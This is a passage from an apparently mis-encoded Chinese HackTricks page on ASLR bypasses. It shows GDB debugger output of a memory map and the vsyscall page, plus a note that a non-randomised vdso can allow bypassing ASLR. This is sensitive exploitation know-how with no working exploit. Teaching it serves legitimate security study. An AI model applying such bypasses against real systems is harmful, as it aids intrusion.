0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  x.g &lt;pre&gt; 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g &lt;pre&gt; 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gefâ¤  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
</code></pre>
<h3 id="vdso"><a class="header" href="#vdso">vDSO</a></h3>
<p>å› æ­¤ï¼Œè¯·æ³¨æ„ï¼Œå¦‚æœå†…æ ¸æ˜¯ä½¿ç”¨ CONFIG_COMPAT_VDSO ç¼–è¯‘çš„ï¼Œ<strong>é€šè¿‡æ»¥ç”¨ vdso ç»•è¿‡ ASLR</strong> å¯èƒ½æ˜¯å¯è¡Œçš„ï¼Œå› ä¸º vdso åœ°å€ä¸ä¼šè¢«éšæœºåŒ–ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
<a href="../../rop-return-oriented-programing/ret2vdso.html">ret2vdso.md</a>
{% endcontent-ref %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../binary-exploitation/common-binary-protections-and-bypasses/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../binary-exploitation/common-binary-protections-and-bypasses/aslr/ret2plt.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../binary-exploitation/common-binary-protections-and-bypasses/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../binary-exploitation/common-binary-protections-and-bypasses/aslr/ret2plt.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
